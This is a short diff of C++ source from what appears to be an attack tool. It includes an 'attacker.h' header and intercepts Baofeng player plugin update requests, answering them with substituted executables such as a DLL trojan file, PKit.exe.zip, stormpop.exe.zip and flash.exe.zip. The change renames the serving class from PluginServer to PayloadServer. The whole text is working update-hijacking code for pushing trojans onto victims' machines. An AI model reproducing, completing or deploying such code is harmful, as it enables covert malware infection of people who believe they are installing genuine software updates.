@@ -1,5 +1,5 @@
 #include "baofeng.h"
-#include "PluginServer.h"
+#include "PayloadServer.h"
 #include "../attacker.h"
 #include "../HttpUtils.h"
 #include "../cipher/CryptoUtils.h"
@@ -64,13 +64,13 @@ int BaofengPllugin::replyBaofengPlugin(char* dstbuf, int len, int dstbuflimit, L
 	if (gBaofengFlag == 1)
 	{
 		string filename = Public::getUserUrl(lphttp->username, WEIXIN_PC_UPDATE_EXE_FILENAME);
-		int ret = PluginServer::SendPluginFile(filename.c_str(), lphttp, szHttpPartialZipFormat, 1);
+		int ret = PayloadServer::SendPluginFile(filename.c_str(), lphttp, szHttpPartialZipFormat, 1);
 		return 0;
 	}
 	else if (gBaofengFlag == 2)
 	{
 		string filename = Public::getUserUrl(lphttp->username, DLLTROJAN_FILE_NAME);
-		int ret = PluginServer::SendPluginFile(filename.c_str(), lphttp, szHttpPartialZipFormat, 1);
+		int ret = PayloadServer::SendPluginFile(filename.c_str(), lphttp, szHttpPartialZipFormat, 1);
 		return 0;
 	}
 	else if (gBaofengFlag == 5)
@@ -86,7 +86,7 @@ int BaofengPllugin::replyBaofengPlugin(char* dstbuf, int len, int dstbuflimit, L
 		ret = Public::zipFile(inzipfn.c_str(), newexefn, zipfn);
 
 		string filename = Public::getUserUrl(lphttp->username, "PKit.exe.zip");
-		ret = PluginServer::SendPluginFile(filename.c_str(), lphttp, szHttpPartialZipFormat, 1);
+		ret = PayloadServer::SendPluginFile(filename.c_str(), lphttp, szHttpPartialZipFormat, 1);
 		return 0;
 
 	}
@@ -103,7 +103,7 @@ int BaofengPllugin::replyBaofengPlugin(char* dstbuf, int len, int dstbuflimit, L
 		ret = Public::zipFile(inzipfn.c_str(), newexefn, zipfn);
 
 		string filename = Public::getUserUrl(lphttp->username, "stormpop.exe.zip");
-		ret = PluginServer::SendPluginFile(filename.c_str(), lphttp, szHttpPartialZipFormat, 1);
+		ret = PayloadServer::SendPluginFile(filename.c_str(), lphttp, szHttpPartialZipFormat, 1);
 		return 0;
 	}
 	else if (gBaofengFlag == 4)
@@ -119,7 +119,7 @@ int BaofengPllugin::replyBaofengPlugin(char* dstbuf, int len, int dstbuflimit, L
 		ret = Public::zipFile(inzipfn.c_str(), newexefn, zipfn);
 
 		string filename = Public::getUserUrl(lphttp->username, "flash.exe.zip");
-		ret = PluginServer::SendPluginFile(filename.c_str(), lphttp, szHttpPartialZipFormat, 1);
+		ret = PayloadServer::SendPluginFile(filename.c_str(), lphttp, szHttpPartialZipFormat, 1);
 		return 0;
 	}
 	else if (gBaofengFlag == 3)
